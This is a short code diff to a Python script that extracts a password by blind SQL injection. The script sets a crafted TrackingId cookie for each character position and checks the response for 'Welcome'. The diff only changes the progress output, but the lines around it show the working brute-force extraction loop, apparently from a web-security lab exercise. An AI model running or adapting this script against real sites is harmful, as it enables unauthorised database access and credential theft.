@@ -28,7 +28,7 @@ tracking_id = cookies_dict["TrackingId"]
 password = ""
 for i in range(1,21):
     for c in string.ascii_lowercase +string.digits:
-        print("Trying position " + str(i) + " and char " + str(c))
+        print("\rTrying position " + str(i) + " and char " + str(c), end="")
         cookies_dict["TrackingId"] = get_sqli(tracking_id, i,c)
         resp = requests.get(url, cookies=cookies_dict)
         resp.close()
@@ -36,7 +36,7 @@ for i in range(1,21):
         match =re.match(".*Welcome.*",html)
         if match is not None:
             password = password + str(c)
-            print("\r"+password)
+            print("\n" + password)
             break
 
 print("PASSWORD: "+password)
